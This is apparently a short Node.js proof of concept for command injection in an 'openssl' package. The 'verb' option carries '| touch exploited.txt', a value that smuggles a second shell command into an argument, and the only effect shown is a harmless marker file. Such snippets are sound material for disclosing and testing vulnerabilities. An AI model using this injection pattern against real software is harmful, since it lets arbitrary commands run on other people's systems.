const openssl = require('openssl');

const opts = {
    verb: "| touch exploited.txt",
    flags: "",
    tail: ""
};

const r = openssl(opts);
